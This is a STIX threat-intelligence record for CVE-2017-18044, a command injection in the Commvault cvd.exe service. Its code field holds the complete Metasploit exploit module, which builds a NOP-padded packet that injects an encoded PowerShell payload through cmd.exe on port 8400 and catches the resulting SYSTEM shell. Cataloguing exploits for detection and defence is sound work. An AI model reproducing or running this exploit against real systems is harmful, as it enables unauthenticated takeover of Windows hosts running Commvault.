{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6ccc5205-c177-4fa2-a6fd-60813e4612cf",
    "created": "2024-08-14T16:46:17.247595Z",
    "modified": "2024-08-14T16:46:17.247599Z",
    "name": "Commvault Communications Service (cvd) Command Injection",
    "description": " This module exploits a command injection vulnerability discovered in Commvault Service v11 SP5 and earlier versions (tested in v11 SP5 and v10). The vulnerability exists in the cvd.exe service and allows an attacker to execute arbitrary commands in the context of the service. By default, the Commvault Communications service installs and runs as SYSTEM in Windows and does not require authentication. This vulnerability was discovered in the Windows version. The Linux version wasn't tested.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/commvault_cmd_exec.rb",
            "external_id": "commvault_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-18044"
        },
        {
            "source_name": "reference",
            "url": "https://www.securifera.com/advisories/sec-2017-0001/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Powershell\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Commvault Communications Service (cvd) Command Injection',\n      'Description'    => %q{\n        This module exploits a command injection vulnerability\n        discovered in Commvault Service v11 SP5 and earlier versions (tested in v11 SP5\n        and v10). The vulnerability exists in the cvd.exe service and allows an\n        attacker to execute arbitrary commands in the context of the service. By\n        default, the Commvault Communications service installs and runs as SYSTEM in\n        Windows and does not require authentication. This vulnerability was discovered\n        in the Windows version. The Linux version wasn't tested.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'b0yd', # @rwincey / Vulnerability Discovery and MSF module author\n        ],\n      'References'     =>\n        [\n          ['CVE', '2017-18044'],\n          ['URL', 'https://www.securifera.com/advisories/sec-2017-0001/']\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Commvault Communications Service (cvd) / Microsoft Windows 7 and higher',\n            {\n              'Arch' => [ARCH_X64, ARCH_X86]\n            }\n          ],\n        ],\n      'Privileged'     => true,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2017-12-12'))\n\n      register_options([Opt::RPORT(8400)])\n\n    end\n\n  def exploit\n\n    buf = build_exploit\n    print_status(\"Connecting to Commvault Communications Service.\")\n    connect\n    print_status(\"Executing payload\")\n    #Send the payload\n    sock.put(buf)\n    #Handle the shell\n    handler\n    disconnect\n\n  end\n\n\n  def build_exploit\n\n    #Get encoded powershell of payload\n    command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true, method: 'reflection')\n    #Remove additional cmd.exe call\n    psh = \"powershell\"\n    idx = command.index(psh)\n    command = command[(idx)..-1]\n\n    #Build packet\n    cmd_path = 'C:\\Windows\\System32\\cmd.exe'\n    msg_type = 9\n    zero = 0\n    payload = \"\"\n    payload += make_nops(8)\n    payload += [msg_type].pack('I>')\n    payload += make_nops(328)\n    payload += cmd_path\n    payload += \";\"\n    payload += ' /c \"'\n    payload += command\n    payload += '\" && echo '\n    payload += \"\\x00\"\n    payload += [zero].pack('I>')\n\n    #Add length header and payload\n    ret_data = [payload.length].pack('I>')\n    ret_data += payload\n\n    ret_data\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-12-12",
    "x_mitre_platforms": [
        "win'"
    ]
}